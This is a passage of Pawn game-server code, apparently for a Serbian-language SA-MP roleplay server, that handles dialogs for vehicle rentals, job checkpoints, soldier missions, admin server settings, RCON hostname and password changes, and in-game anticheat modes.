				{
					if(GetPlayerMoney(playerid) < 300) return SendErrorMessage(playerid, "Nemas dovoljno novca!");

					new Float:X, Float:Y, Float:Z;
			        GetPlayerPos(playerid, X,Y,Z);

                    Novi_DestroyVehicle(RentVozilo[playerid]);
			        RentVozilo[playerid] = V01D_CreateVehicle(462, X, Y, Z, 0, 0, 0, -1 );
                    Novi_PutPlayerInVehicle(playerid, RentVozilo[playerid], 0);

			        Rentao[playerid] = true;
			        DajIgracuNovac(playerid, -300);
			        SendClientMessage(playerid, 0xF81414FF, "Uspesno si rentao Faggio za 300$! Koristi /unrent bilo kada!");
			        return 1;
				}
				case 1:
				{
					if(GetPlayerMoney(playerid) < 500) return SendErrorMessage(playerid, "Nemas dovoljno novca!");

					new Float:X, Float:Y, Float:Z;
			        GetPlayerPos(playerid, X,Y,Z);
			        
                    Novi_DestroyVehicle(RentVozilo[playerid]);
			        RentVozilo[playerid] = V01D_CreateVehicle(405, X, Y, Z, 0, 0, 0, -1 );
                    Novi_PutPlayerInVehicle(playerid, RentVozilo[playerid], 0);

			        Rentao[playerid] = true;
			        DajIgracuNovac(playerid, -500);
			        SendClientMessage(playerid, 0xF81414FF, "Uspesno si rentao Sentinel za 500$! Koristi /unrent bilo kada!");
			        return 1;
				}
                case 2:
                {
                    if(GetPlayerMoney(playerid) < 600) return SendErrorMessage(playerid, "Nemas dovoljno novca!");

                    new Float:X, Float:Y, Float:Z;
                    GetPlayerPos(playerid, X,Y,Z);
                    
                    Novi_DestroyVehicle(RentVozilo[playerid]);
                    RentVozilo[playerid] = V01D_CreateVehicle(410, X, Y, Z, 0, 0, 0, -1 );
                    Novi_PutPlayerInVehicle(playerid, RentVozilo[playerid], 0);

                    Rentao[playerid] = true;
                    DajIgracuNovac(playerid, -600);
                    SendClientMessage(playerid, 0xF81414FF, "Uspesno si rentao Manana za 600$! Koristi /unrent bilo kada!");
                    return 1;
                }
                case 3:
                {
                    if(GetPlayerMoney(playerid) < 400) return SendErrorMessage(playerid, "Nemas dovoljno novca!");

                    new Float:X, Float:Y, Float:Z;
                    GetPlayerPos(playerid, X,Y,Z);
                    
                    Novi_DestroyVehicle(RentVozilo[playerid]);
                    RentVozilo[playerid] = V01D_CreateVehicle(426, X, Y, Z, 0, 0, 0, -1 );
                    Novi_PutPlayerInVehicle(playerid, RentVozilo[playerid], 0);

                    Rentao[playerid] = true;
                    DajIgracuNovac(playerid, -400);
                    SendClientMessage(playerid, 0xF81414FF, "Uspesno si rentao Premier za 400$! Koristi /unrent bilo kada!");
                    return 1;
                }
                case 4:
                {
                    if(GetPlayerMoney(playerid) < 700) return SendErrorMessage(playerid, "Nemas dovoljno novca!");

                    new Float:X, Float:Y, Float:Z;
                    GetPlayerPos(playerid, X,Y,Z);
                    
                    Novi_DestroyVehicle(RentVozilo[playerid]);
                    RentVozilo[playerid] = V01D_CreateVehicle(445, X, Y, Z, 0, 0, 0, -1 );
                    Novi_PutPlayerInVehicle(playerid, RentVozilo[playerid], 0);

                    Rentao[playerid] = true;
                    DajIgracuNovac(playerid, -700);
                    SendClientMessage(playerid, 0xF81414FF, "Uspesno si rentao Admiral za 700$! Koristi /unrent bilo kada!");
                    return 1;
                }
			}
		}
	}
    else if( dialogid == DIALOG_DILERHELP )
    {
    	if(!response) return 1;
    	if(response)
    	{
    		switch(listitem)
    		{
    			case 0:
    			{
    			    Novi_DisablePlayerCheckpoint(playerid);
    				Novi_SetPlayerCheckpoint(playerid, -1435.7037,-963.8199,201.0211, 2.0);
    				SendInfoMessage(playerid, "Lokacija Diler Prerada Droge je oznacena na mapi!");
    				DilerCheckpoint[playerid] = 1;
    			}
    			case 1:
    			{
    			    Novi_DisablePlayerCheckpoint(playerid);
    				Novi_SetPlayerCheckpoint(playerid, 1937.1750,-1984.4272,13.5469, 2.0);
    				SendInfoMessage(playerid, "Lokacija Diler Kupovina Semena je oznacena na mapi!");
    				DilerCheckpoint[playerid] = 2;
    			}
    			case 2:
    			{
    			    Novi_DisablePlayerCheckpoint(playerid);
    				Novi_SetPlayerCheckpoint(playerid, 902.5450,-1819.6349,12.5567, 2.0);
    				SendInfoMessage(playerid, "Lokacija Diler Prodaja Droge je oznacena na mapi!");
    				DilerCheckpoint[playerid] = 3;
    			}
    		}
    	}
    }
	
    else if( dialogid == DIALOG_VOJNIKMISIJE )
    {
    	if(!response) return 0;
		if(response)
		{
			switch(listitem)
			{
				case 0:
				{
					SendClientMessage(playerid, -1, "Vojnik: Odlucio si se za to? Idi popricaj sa generalom!");
					RadiVojnik{playerid} = true;
					Novi_SetPlayerCheckpoint(playerid, 406.5945, 2532.9226, 16.5527, 2.0);
					VojnikMisijaJedanCP{playerid} = 1;

					VojnikMisijaJedanVozilo[playerid] = 0;
					GeneralTimer{playerid} = 0;
					UzeoOpremuVojnik{playerid} = false;
					Vakcina[playerid] = 0;
					UpucaoObjekat{playerid} = false;
					TrebaDaPokupiVakcinu{playerid} = false;
					TrebaDaUstane{playerid} = false;
					UbioActora{playerid} = false;
					UbioActora1{playerid} = false;
					UbioActora2{playerid} = false;
					UbioActora3{playerid} = false;
					UpucajNaucnika1{playerid} = false;
					UpucajNaucnika2{playerid} = false;
					UpucajNeprijatelja1{playerid} = false;
					UpucajNeprijatelja2{playerid} = false;

					return 1;
				}
				case 1:
				{
					   
                    SendClientMessage(playerid, -1, "Vojnik: Odlucio si se za to? Idi popricaj sa generalom!");
                    
                    Novi_SetPlayerCheckpoint(playerid, 406.5945, 2532.9226, 16.5527, 2.0);

                    vojnik2CP[playerid] = 1;
                    radiVojnik2[playerid] = true;
                    
					return 1;
				}
			}
		}
    }

	else if( dialogid == dialog_SERVERSTATS ) {
	    if( !response ) return true;
        if( response ) {
            switch( listitem ) {
                case 0: {
					
                    new coordsstring[ 128 ], srecnisati[ 11 ], mogucnostreporta[ 11 ], mogucnostpitanja[ 11 ], mogucnostkupovinev[ 11 ], oglasici[ 11 ], regic[ 11 ];
                    new hJob[32];

                    if( ServerInfo[ HappyHours ] == true ) srecnisati = "Ukljuceni";
                    else srecnisati = "Iskljuceni";

                    switch(ServerInfo[HappyJob]) {

                        case 0: { hJob = "Iskljuceni"; }
                        case 1: { hJob = "Kosac Trave"; }
                        case 2: { hJob = "Rudar"; }
                        case 3: { hJob = "Diler"; }
                        case 4: { hJob = "Vojnik"; }
                        case 5: { hJob = "Delivery"; }
                        case 6: { hJob = "Sabotazer"; }
                        case 7: { hJob = "Moler"; }
                        case 8: { hJob = "Haker"; }
                        case 9: { hJob = "Lovac"; }
                        case 10: { hJob = "Porno Glumica"; }
                        case 11: { hJob = "Astronaut"; }
                        case 12: { hJob = "Prevoznik Drveca"; }
                        case 13: { hJob = "Pilot"; }
                        case 14: { hJob = "Elektricar"; }
                    }

                    new tombolaon[15];

                    if( ServerInfo[SrecniID] == 1) tombolaon = "ukljucena";
                    else tombolaon = "iskljucena";
                    
                    if( ServerInfo[ KupovinaVozila ] == true ) mogucnostkupovinev = "ukljucena";
                    else mogucnostkupovinev = "iskljucena";
                    
                    if( ServerInfo[ Report ] == true ) mogucnostreporta = "ukljucena";
                    else mogucnostreporta = "iskljucena";
                    
                    if( ServerInfo[ Pitanja ] == true ) mogucnostpitanja = "ukljucena";
                    else mogucnostpitanja = "iskljucena";
                    
                    if( ServerInfo[ Oglasi ] == true ) oglasici = "ukljucena";
                    else oglasici = "iskljucena";
                    
                    if( ServerInfo[ Registracija ] == true ) regic = "ukljucena";
                    else regic = "iskljucena";
                    
			        strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ) );
				    strcat( DialogStrgEx, "__________________________________________________________________\n");
					format( coordsstring, sizeof( coordsstring ), ""col_white"Ukupno poseta servera: "col_crvena"%d "col_crvena"| "col_white"Ukupno registrovanih clanova: "col_crvena"%d\n", ServerInfo[ BrojPosetaServeru ], ServerInfo[ RegistrovanihKorisnika ] );
					strcat( DialogStrgEx, coordsstring );
					format( coordsstring, sizeof( coordsstring ), ""col_white"Ukupno banovanih korisnika: "col_crvena"%d "col_crvena"| "col_white"Ukupno kikovanih korisnika: "col_crvena"%d\n", ServerInfo[ BanovanihKorisnika ], ServerInfo[ KikovanihKorisnika ] );
			        strcat( DialogStrgEx, coordsstring );
					format( coordsstring, sizeof( coordsstring ), ""col_white"Broj dodeljenih warnova: "col_crvena"%d "col_crvena"| "col_white"Srecni sati: "col_crvena"%s\n", ServerInfo[ BrojWarnova ], srecnisati );
			        strcat( DialogStrgEx, coordsstring );
			        format( coordsstring, sizeof( coordsstring ), ""col_white"Pocetni level: "col_crvena"%d "col_crvena"| "col_white"Pocetni novac: "col_crvena"%d$\n", ServerInfo[ PocetniLevel ], ServerInfo[ PocetniNovaca ] );
			        strcat( DialogStrgEx, coordsstring );
			        format( coordsstring, sizeof( coordsstring ), ""col_white"Mogucnost kupovine vozila je "col_crvena"%s"col_white".\n", mogucnostkupovinev );
			        strcat( DialogStrgEx, coordsstring );
			        format( coordsstring, sizeof( coordsstring ), ""col_white"Mogucnost slanja pitanja Admin TEAM-u je "col_crvena"%s"col_white".\n", mogucnostpitanja );
                    strcat( DialogStrgEx, coordsstring );
			        format( coordsstring, sizeof( coordsstring ), ""col_white"Mogucnost registracije je "col_crvena"%s"col_white".\n", regic );
					strcat( DialogStrgEx, coordsstring );
			        format( coordsstring, sizeof( coordsstring ), ""col_white"Mogucnost slanja reporta Admin TEAM-u je "col_crvena"%s"col_white".\n", mogucnostreporta );
			        strcat( DialogStrgEx, coordsstring );
			        format( coordsstring, sizeof( coordsstring ), ""col_white"Trenutni broj kreiranih vozila je "col_crvena"%d"col_white".\n", ServerInfo[ BrojKreiranihVozila ] );
			        strcat( DialogStrgEx, coordsstring );
			        format( coordsstring, sizeof( coordsstring ), ""col_white"Mogucnost postavljanja oglasa je "col_crvena"%s"col_white".\n", oglasici );
			        strcat( DialogStrgEx, coordsstring );
			        format( coordsstring, sizeof( coordsstring ), ""col_white"Rekord servera je "col_crvena"%d"col_white".\n", ServerInfo[ RekordServera ] );
			        strcat( DialogStrgEx, coordsstring );
                    format( coordsstring, sizeof( coordsstring ), ""col_white"HappyJob je "col_crvena"%s"col_white".\n", hJob );
                    strcat( DialogStrgEx, coordsstring );
                    format( coordsstring, sizeof( coordsstring ), ""col_white"SrecniID je "col_crvena"%s"col_white".\n", tombolaon );
                    strcat( DialogStrgEx, coordsstring );
                    format( coordsstring, sizeof( coordsstring ), ""col_white"Min cena deonica je "col_crvena"%d"col_white".\n", ServerInfo[cenaDeonicaMIN] );
                    strcat( DialogStrgEx, coordsstring );
                    format( coordsstring, sizeof( coordsstring ), ""col_white"Max cena deonica je "col_crvena"%d"col_white".\n", ServerInfo[cenaDeonicaMAX] );
                    strcat( DialogStrgEx, coordsstring );
			        strcat( DialogStrgEx, "__________________________________________________________________");
			        ShowPlayerDialog( playerid, 0, DSMSG, D_NASLOV, DialogStrgEx, "U redu", "" );
					strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ) );
					
					SaveServerStats( );
				}
				case 1: {
				    ServerStatsChose[ playerid ] = 1;
				    ShowPlayerDialog( playerid, dialog_SERVERSTATS_2, DSMSG, D_NASLOV, "Mogucnost kupovine vozila:", "Ukljuci", "Iskljuci" );
				}
				case 2: {
				    ServerStatsChose[ playerid ] = 2;
				    ShowPlayerDialog( playerid, dialog_SERVERSTATS_2, DSMSG, D_NASLOV, "Srecni sati( dupli respekti ):", "Ukljuci", "Iskljuci" );
				}
				case 3: {
				    ServerStatsChose[ playerid ] = 3;
				    ShowPlayerDialog( playerid, dialog_SERVERSTATS_2, DSMSG, D_NASLOV, "Mogucnost slanja pitanja:", "Ukljuci", "Iskljuci" );
				}
				case 4: {
				    ServerStatsChose[ playerid ] = 4;
				    ShowPlayerDialog( playerid, dialog_SERVERSTATS_2, DSMSG, D_NASLOV, "Mogucnost slanja reporta:", "Ukljuci", "Iskljuci" );
				}
				case 5: {
					ShowPlayerDialog( playerid, dialog_SERVERSTATS_3, DSI, D_NASLOV, "Unesti broj koji predstavlja pocetni level igraca pri registraciji.", D_ODABERI, D_ODUSTANI );
				}
				case 6: {
					ShowPlayerDialog( playerid, dialog_SERVERSTATS_4, DSI, D_NASLOV, "Unesti broj koji predstavlja pocetni novac igraca pri registraciji.", D_ODABERI, D_ODUSTANI );
				}
				case 7: {
				    ServerStatsChose[ playerid ] = 5;
				    ShowPlayerDialog( playerid, dialog_SERVERSTATS_2, DSMSG, D_NASLOV, "Mogucnost postavljanja oglasa:", "Ukljuci", "Iskljuci" );
				}
				case 8: {
				    ServerStatsChose[ playerid ] = 6;
				    ShowPlayerDialog( playerid, dialog_SERVERSTATS_2, DSMSG, D_NASLOV, "Mogucnost registracije:", "Ukljuci", "Iskljuci" );
				}
                case 9: {
                    ShowPlayerDialog( playerid, dialog_SERVERSTATS_5, DIALOG_STYLE_LIST, "Odaberi Happy Job", "Iskljuci\nKosac Trave\nRudar\nDiler\nVojnik\nDelivery\nSabotazer\nMoler\nHaker\nLovac\nPorno Glumica\nAstronaut\nPrevoznik Drveca\nPilot\nElektricar", "Odaberi", "Odustani" );

                }
                case 10: {
                    ServerStatsChose[ playerid ] = 7;
                    ShowPlayerDialog( playerid, dialog_SERVERSTATS_2, DSMSG, D_NASLOV, "SrecniID:", "Ukljuci", "Iskljuci" );
                }
                case 11: {
                    ShowPlayerDialog(playerid, dialog_hostnameChange, DSI, "Promeni Hostname", "Unesite hostname koji zelite da stavite", "Potvrdi", "Odustani");
                }
                case 12: {
                    ShowPlayerDialog(playerid, dialog_passwordChange, DSI, "Promeni Sifru", "Unesite sifru koji zelite da stavite", "Potvrdi", "Odustani");
                }
                case 13: {
                    new string[128], BigString[2000];
                    for(new job = 1; job < MAX_JOBS; job++) {

                        format(string, sizeof(string), "%s\n", jobsInfos[job][jName]);
                        strcat(BigString, string);
                    }
                    ShowPlayerDialog(playerid, dialog_platePoslova, DIALOG_STYLE_LIST, "Odaberite Posao", BigString, "Odaberi", "Odustani");
                }
			}
        }
	}
    else if(dialogid == dialog_platePoslova && response) {

        new string[128];
        format(string, sizeof(string), "Unesite platu za posao %s", getJobName(listitem + 1));
        posaoPlate[playerid] = listitem + 1;
        SPD(playerid, dialog_platePoslovaPlata, DIALOG_STYLE_INPUT, "Unesi Platu", string, "Unesi", "Odustani");

        return 1;
    }
    else if(dialogid == dialog_platePoslovaPlata) {

        if(!response) {

            new string[128], BigString[2000];
            for(new job = 1; job < MAX_JOBS; job++) {

                format(string, sizeof(string), "%s\n", jobsInfos[job][jName]);
                strcat(BigString, string);
            }
            ShowPlayerDialog(playerid, dialog_platePoslova, DIALOG_STYLE_LIST, "Odaberite Posao", BigString, "Odaberi", "Odustani");
            return 1;
        }
        if(response) {

            new plata = strval(inputtext);
            if(plata < 1 || plata > 100000) return SendErrorMessage(playerid, "Plata ne moze biti manja od 1 ili veca od 100000");

            if(posaoPlate[playerid] == 1) PlataPosla[PLATA_KOSAC] = plata;
            else if(posaoPlate[playerid] == 2) PlataPosla[PLATA_RUDAR] = plata;
            else if(posaoPlate[playerid] == 3) PlataPosla[PLATA_DILER] = plata;
            else if(posaoPlate[playerid] == 4) PlataPosla[PLATA_VOJNIK] = plata;
            else if(posaoPlate[playerid] == 5) PlataPosla[PLATA_DELIVERY_LEGAL] = plata;
            else if(posaoPlate[playerid] == 6) PlataPosla[PLATA_SABOTAZER] = plata;
            else if(posaoPlate[playerid] == 7) PlataPosla[PLATA_MOLER] = plata;
            else if(posaoPlate[playerid] == 8) PlataPosla[PLATA_HAKER] = plata;
            else if(posaoPlate[playerid] == 9) PlataPosla[PLATA_LOVAC] = plata;
            else if(posaoPlate[playerid] == 10) PlataPosla[PLATA_PORNO] = plata;
            else if(posaoPlate[playerid] == 11) PlataPosla[PLATA_ASTRONAUT] = plata;
            else if(posaoPlate[playerid] == 12) PlataPosla[PLATA_DRVA] = plata;
            else if(posaoPlate[playerid] == 13) PlataPosla[PLATA_PILOT] = plata;
            else if(posaoPlate[playerid] == 14) PlataPosla[PLATA_ELEKTRIK] = plata;

            SacuvajPlate();

            SendInfoMessage(playerid, "Uspesno si stavio platu na poslu %s na %d", getJobName(posaoPlate[playerid]), plata);

            return 1;
        }

        return 1;
    }
    else if(dialogid == dialog_passwordChange && response) {

        new hostname[128], bigStr[248];
        if(sscanf(inputtext, "s[128]", hostname)) return ShowPlayerDialog(playerid, dialog_passwordChange, DSI, "Promeni Sifru", "Unesite sifru koji zelite da stavite", "Potvrdi", "Odustani");
        format(bigStr, sizeof(bigStr), "password %s", hostname);
        SendRconCommand(bigStr);

        SendInfoMessage(playerid, "Uspesno si postavio sifru na %s !", hostname);

        return 1;
    }
    else if(dialogid == dialog_hostnameChange && response) {

        new hostname[128], bigStr[248];
        if(sscanf(inputtext, "s[128]", hostname)) return ShowPlayerDialog(playerid, dialog_hostnameChange, DSI, "Promeni Hostname", "Unesite hostname koji zelite da stavite", "Potvrdi", "Odustani");
        format(bigStr, sizeof(bigStr), "hostname %s", hostname);
        SendRconCommand(bigStr);

        SendInfoMessage(playerid, "Uspesno si promenio hostname!");

        return 1;
    }
    else if(dialogid == dialog_SERVERSTATS_5) {

        if(!response) return 0;
        if(response) {

            ServerInfo[HappyJob] = listitem;

            SaveServerStats();
            happyJobTDControl(ServerInfo[HappyJob]);

            SendInfoMessage(playerid, "Uspesno si promenio srecni posao!");

        }
    }
	else if( dialogid == dialog_SERVERSTATS_4 ) {
	    if( !response ) return true;
        if( response ) {
            new broj;
            if( sscanf( inputtext, "i", broj ) ) return ShowPlayerDialog( playerid, dialog_SERVERSTATS_4, DSI, D_NASLOV, "Unesti broj koji predstavlja pocetni novac igraca pri registraciji.", D_ODABERI, D_ODUSTANI );
            if( broj < 1 ) return SendErrorMessage( playerid, "Uneseni broj ne moze biti manji od 1." );

            ServerInfo[ PocetniNovaca ] = broj;
			SaveServerStats( );
			SendInfoMessage( playerid, "Postavili ste pocetni novac na "col_white"%d$.", broj );
		}
	}
	else if( dialogid == dialog_SERVERSTATS_3 ) {
	    if( !response ) return true;
        if( response ) {
            new broj;
            if( sscanf( inputtext, "i", broj ) ) return ShowPlayerDialog( playerid, dialog_SERVERSTATS_3, DSI, D_NASLOV, "Unesti broj koji predstavlja pocetni level igraca pri registraciji.", D_ODABERI, D_ODUSTANI );
            if( broj < 1 || broj > 5 ) return SendErrorMessage( playerid, "Uneseni broj ne moze biti manji od 1 a veci od 5." );

            ServerInfo[ PocetniLevel ] = broj;
			SaveServerStats( );
			SendInfoMessage( playerid, "Postavili ste pocetni level na "col_white"%d.", broj );
		}
	}
	else if( dialogid == dialog_SERVERSTATS_2 ) {
        if( response ) {
            switch( ServerStatsChose[ playerid ] ) {
                case 1: {
                    ServerInfo[ KupovinaVozila ] = true;
                    SendInfoMessage( playerid, "Ukljucio si mogucnost kupovine vozila po salonima." );
                }
                case 2: {
                    ServerInfo[ HappyHours ] = true;
                    SendInfoMessage( playerid, "Ukljucio si srecne sate." );
			    	happyHoursTDControl(ServerInfo[HappyHours]);
                }
                case 3: {
                    ServerInfo[ Pitanja ] = true;
                    SendInfoMessage( playerid, "Ukljucio si mogucnost slanja pitanja Admin TEAM-u." );
                }
                case 4: {
                    ServerInfo[ Report ] = true;
                    SendInfoMessage( playerid, "Ukljucio si mogucnost slanja reporta Admin TEAM-u." );
                }
                case 5: {
                    ServerInfo[ Oglasi ] = true;
                    SendInfoMessage( playerid, "Ukljucio si mogucnost postavljanja oglasa." );
                }
                case 6: {
                    ServerInfo[ Registracija ] = true;
                    SendInfoMessage( playerid, "Ukljucio si mogucnost registracije." );
                }
                case 7: {
                    ServerInfo[SrecniID] = 1;
                    SendInfoMessage(playerid, "Ukljucio si tombolu!");
                    va_SendClientMessageToAll(0xC34848FF, "(SRECNI ID) : {FFFFFF}Vlasnik %s je ukljucio srecni ID!", ImeIgraca(playerid));
                }
			}
			SaveServerStats( );
		}
		else if( !response ) {
            switch( ServerStatsChose[ playerid ] ) {
                case 1: {
                    ServerInfo[ KupovinaVozila ] = false;
                    SendInfoMessage( playerid, "Iskljucio si mogucnost kupovine vozila po salonima." );
                }
                case 2: {
                    ServerInfo[ HappyHours ] = false;
                    SendInfoMessage( playerid, "Iskljucio si srecne sate." );
			    	happyHoursTDControl(ServerInfo[HappyHours]);
                }
                case 3: {
                    ServerInfo[ Pitanja ] = false;
                    SendInfoMessage( playerid, "Iskljucio si mogucnost slanja pitanja Admin TEAM-u." );
                }
                case 4: {
                    ServerInfo[ Report ] = false;
                    SendInfoMessage( playerid, "Iskljucio si mogucnost slanja reporta Admin TEAM-u." );
                }
                case 5: {
                    ServerInfo[ Oglasi ] = false;
                    SendInfoMessage( playerid, "Iskljucio si mogucnost postavljanja oglasa." );
                }
                case 6: {
                    ServerInfo[ Registracija ] = false;
                    SendInfoMessage( playerid, "Iskljucio si mogucnost registracije." );
                }
                case 7: {
                    ServerInfo[SrecniID] = 0;
                    SendInfoMessage(playerid, "Iskljucio si tombolu!");
                    va_SendClientMessageToAll(0xC34848FF, "(SRECNI ID) : {FFFFFF}Vlasnik %s je iskljucio srecni ID!", ImeIgraca(playerid));
                }
			}
			SaveServerStats( );
		}
	}
	else if( dialogid == dialog_ANTICHEAT ) {
        if( response ) {
            switch( listitem ) {
                case 0: {
					anticheatinfo[ playerid ] = 0;
                    ShowPlayerDialog( playerid, dialog_ANTICHEAT_2, DSL, "antiWeaponHack", "Iskljuci/Ukljuci\nPromeni rezim rada", D_ODABERI, D_ODUSTANI );
                }
                case 1: {
					anticheatinfo[ playerid ] = 1;
                    ShowPlayerDialog( playerid, dialog_ANTICHEAT_2, DSL, "antiTeleportHack", "Iskljuci/Ukljuci\nPromeni rezim rada", D_ODABERI, D_ODUSTANI );
                }
                case 2: {
					anticheatinfo[ playerid ] = 2;
                    ShowPlayerDialog( playerid, dialog_ANTICHEAT_2, DSL, "antiFlyHack", "Iskljuci/Ukljuci\nPromeni rezim rada", D_ODABERI, D_ODUSTANI );
                }
                case 3: {
					anticheatinfo[ playerid ] = 3;
                    ShowPlayerDialog( playerid, dialog_ANTICHEAT_2, DSL, "antiVehRepHack", "Iskljuci/Ukljuci\nPromeni rezim rada", D_ODABERI, D_ODUSTANI );
                }
                case 4: {
					anticheatinfo[ playerid ] = 4;
                    ShowPlayerDialog( playerid, dialog_ANTICHEAT_2, DSL, "antiJetpackHack", "Iskljuci/Ukljuci\nPromeni rezim rada", D_ODABERI, D_ODUSTANI );
                }
                case 5: {
					anticheatinfo[ playerid ] = 5;
                    ShowPlayerDialog( playerid, dialog_ANTICHEAT_2, DSL, "antiSpeedHack", "Iskljuci/Ukljuci\nPromeni rezim rada", D_ODABERI, D_ODUSTANI );
                }
            }
        }
        else { SPD( playerid, dialog_SERVERMI, DSL, D_NASLOV, "Upravljanje serverom\nSacuvaj naloge\nNapravi\nIzbrisi\nIzmeni\nSpisak organizacija\nAntiCheat", D_ODABERI, D_ODUSTANI ); }
	}
	else if( dialogid == dialog_ANTICHEAT_2 ) {
        if( response ) {
            switch( listitem ) {
                case 0: {
                    switch( anticheatinfo[ playerid ] ) {
                		case 0: {
                		    if( antiCheatSS[ antiWeaponH ] ) {
                		        antiCheatSS[ antiWeaponH ] = false;
                		        SCM( playerid, ZUTA, "Iskljucio si antiWeaponHack." );
                		    }
                		    else if( !antiCheatSS[ antiWeaponH ] ) {
                		        antiCheatSS[ antiWeaponH ] = true;
                		        SCM( playerid, ZUTA, "Ukljucio si antiWeaponHack." );
                		    }
                		    SaveAntiCheat( );
                		}
                		case 1: {
                		    if( antiCheatSS[ antiTeleportH ] ) {
                		        antiCheatSS[ antiTeleportH ] = false;
                		        SCM( playerid, ZUTA, "Iskljucio si antiTeleportHack." );
                		    }
                		    else if( !antiCheatSS[ antiTeleportH ] ) {
                		        antiCheatSS[ antiTeleportH ] = true;
                		        SCM( playerid, ZUTA, "Ukljucio si antiTeleportHack." );
                		    }
                		    SaveAntiCheat( );
                		}
                		case 2: {
                		    if( antiCheatSS[ antiFlyH ] ) {
                		        antiCheatSS[ antiFlyH ] = false;
                		        SCM( playerid, ZUTA, "Iskljucio si antiFlyHack." );
                		    }
                		    else if( !antiCheatSS[ antiFlyH ] ) {
                		        antiCheatSS[ antiFlyH ] = true;
                		        SCM( playerid, ZUTA, "Ukljucio si antiFlyHack." );
                		    }
                		    SaveAntiCheat( );
                		}
                		case 3: {
                		    if( antiCheatSS[ antiVehRepair ] ) {
                		        antiCheatSS[ antiVehRepair ] = false;
                		        SCM( playerid, ZUTA, "Iskljucio si antiVehRepairHack." );
                		    }
                		    else if( !antiCheatSS[ antiVehRepair ] ) {
                		        antiCheatSS[ antiVehRepair ] = true;
                		        SCM( playerid, ZUTA, "Ukljucio si antiVehRepairHack." );
                		    }
                		    SaveAntiCheat( );
                		}
                		case 4: {
                		    if( antiCheatSS[ antiJetPackH ] ) {
                		        antiCheatSS[ antiJetPackH ] = false;
                		        SCM( playerid, ZUTA, "Iskljucio si antiJetPackHack." );
                		    }
                		    else if( !antiCheatSS[ antiJetPackH ] ) {
                		        antiCheatSS[ antiJetPackH ] = true;
                		        SCM( playerid, ZUTA, "Ukljucio si antiJetPackHack." );
                		    }
                		    SaveAntiCheat( );
                		}
                		case 5: {
                		    if( antiCheatSS[ antiSpeedH ] ) {
                		        antiCheatSS[ antiSpeedH ] = false;
                		        SCM( playerid, ZUTA, "Iskljucio si antiSpeedHack." );
                		    }
                		    else if( !antiCheatSS[ antiSpeedH ] ) {
                		        antiCheatSS[ antiSpeedH ] = true;
                		        SCM( playerid, ZUTA, "Ukljucio si antiSpeedHack." );
                		    }
                		    SaveAntiCheat( );
                		}
					}
            	}
			    case 1: {
                    new antiCheatName[ 20 ] = "antiVehRepairHack";
                    switch( anticheatinfo[ playerid ] ) {
                		case 0: antiCheatName = "antiWeaponHack";
                		case 1: antiCheatName = "antiTeleportHack";
                		case 2: antiCheatName = "antiFlyHack";
                		case 3: antiCheatName = "antiVehRepairHack";
                		case 4: antiCheatName = "antiJetPackHack";
                		case 5: antiCheatName = "antiSpeedHack";
					}
                    ShowPlayerDialog( playerid, dialog_ANTICHEAT_3, DSL, antiCheatName, "Warning\nKick\nBan", D_ODABERI, D_ODUSTANI );
				}
			}
		}
	}
	else if( dialogid == dialog_ANTICHEAT_3 ) {
        if( response ) {
            switch( listitem ) {
                case 0: {
                    switch( anticheatinfo[ playerid ] ) {
                		case 0: {
                    		antiCheatSS[ WeaponHRezimRada ] = AC_ADMINPORUKA;
                			SCM( playerid, ZUTA, "Postavio si rezim rada na warning za antiWeaponHack." );
						}
						case 1: {
                    		antiCheatSS[ TeleportHRezimRada ] = AC_ADMINPORUKA;
                			SCM( playerid, ZUTA, "Postavio si rezim rada na warning za antiTeleportHack." );
						}
						case 2: {
                    		antiCheatSS[ FlyHRezimRada ] = AC_ADMINPORUKA;
                			SCM( playerid, ZUTA, "Postavio si rezim rada na warning za antiFlyHack." );
						}
						case 3: {
                    		antiCheatSS[ VehRepRezimRada ] = AC_ADMINPORUKA;
                			SCM( playerid, ZUTA, "Postavio si rezim rada na warning za antiVehRepairHack." );
						}
						case 4: {
                    		antiCheatSS[ JetPackHRezimRada ] = AC_ADMINPORUKA;
                			SCM( playerid, ZUTA, "Postavio si rezim rada na warning za antiJetPackHack." );
						}
						case 5: {
                    		antiCheatSS[ SpeedHRezimRada ] = AC_ADMINPORUKA;
                			SCM( playerid, ZUTA, "Postavio si rezim rada na warning za antiSpeedHack." );
						}
					}
					SaveAntiCheat( );
                }
                case 1: {
                    switch( anticheatinfo[ playerid ] ) {
                		case 0: {
                    		antiCheatSS[ WeaponHRezimRada ] = AC_KICK;
                			SCM( playerid, ZUTA, "Postavio si rezim rada na kick za antiWeaponHack." );
						}
						case 1: {
                    		antiCheatSS[ TeleportHRezimRada ] = AC_KICK;
                			SCM( playerid, ZUTA, "Postavio si rezim rada na kick za antiTeleportHack." );
						}
						case 2: {
                    		antiCheatSS[ FlyHRezimRada ] = AC_KICK;
                			SCM( playerid, ZUTA, "Postavio si rezim rada na kick za antiFlyHack." );
						}
						case 3: {
                    		antiCheatSS[ VehRepRezimRada ] = AC_KICK;
                			SCM( playerid, ZUTA, "Postavio si rezim rada na kick za antiVehRepairHack." );
						}
						case 4: {
                    		antiCheatSS[ JetPackHRezimRada ] = AC_KICK;
                			SCM( playerid, ZUTA, "Postavio si rezim rada na kick za antiJetPackHack." );
						}
						case 5: {
                    		antiCheatSS[ SpeedHRezimRada ] = AC_KICK;
                			SCM( playerid, ZUTA, "Postavio si rezim rada na kick za antiSpeedHack." );
						}
					}
					SaveAntiCheat( );
                }
                case 2: {
                    switch( anticheatinfo[ playerid ] ) {
                		case 0: {
                    		antiCheatSS[ WeaponHRezimRada ] = AC_BAN;
                			SCM( playerid, ZUTA, "Postavio si rezim rada na ban za antiWeaponHack." );
						}
						case 1: {
                    		antiCheatSS[ TeleportHRezimRada ] = AC_BAN;
                			SCM( playerid, ZUTA, "Postavio si rezim rada na ban za antiTeleportHack." );
						}
						case 2: {
                    		antiCheatSS[ FlyHRezimRada ] = AC_BAN;
                			SCM( playerid, ZUTA, "Postavio si rezim rada na ban za antiFlyHack." );
						}
						case 3: {
                    		antiCheatSS[ VehRepRezimRada ] = AC_BAN;
                			SCM( playerid, ZUTA, "Postavio si rezim rada na ban za antiVehRepairHack." );
						}
						case 4: {
                    		antiCheatSS[ JetPackHRezimRada ] = AC_BAN;
                			SCM( playerid, ZUTA, "Postavio si rezim rada na ban za antiJetPackHack." );
						}
						case 5: {
                    		antiCheatSS[ SpeedHRezimRada ] = AC_BAN;
                			SCM( playerid, ZUTA, "Postavio si rezim rada na ban za antiSpeedHack." );
						}
					}
					SaveAntiCheat( );
                }
            }
        }
